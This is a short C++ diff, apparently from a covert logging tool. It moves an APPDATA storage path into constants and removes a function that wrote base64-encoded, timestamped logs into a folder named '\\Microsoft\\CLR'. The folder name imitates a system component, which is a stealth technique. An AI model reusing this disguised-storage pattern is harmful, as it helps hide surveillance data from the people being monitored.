@@ -5,8 +5,8 @@
 
 namespace IO {
     std::string GetOurPath(const bool append_separator){
-        std::string appdata_dir(getenv("APPDATA"));
-        std::string full = appdata_dir + "\\Microsoft\\CLR";
+        std::string appdata_dir(getenv(APP_DATA_ENV_VAR_NAME));
+        std::string full = appdata_dir + APP_DIR_INSIDE_APP_DATA_ROAMING;
         return full + (append_separator ? "\\" : "");
     }
 
@@ -24,31 +24,6 @@ namespace IO {
                 c = '\\';
             }
         }
-        return false;
+        return true;
     }
-
-    template <class T> std::string WriteLog(const T &t){
-        std::string path = GetOurPath(true);
-        Helper::DateTime dt;
-        std::string name = dt.GetDateTimeString("_") + ".log";
-        try {
-            std::ofstream file(path + name);
-            if(!file){
-                return "";
-            }
-            std::ostringstream s;
-            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
-            std::string data = Base64::EncryptB64(s.str());
-            file << data;
-            if(!file){
-                return "";
-            }
-            file.close();
-            return name;
-        }
-        catch(...) {
-            return "";
-        }
-    }
-
 }
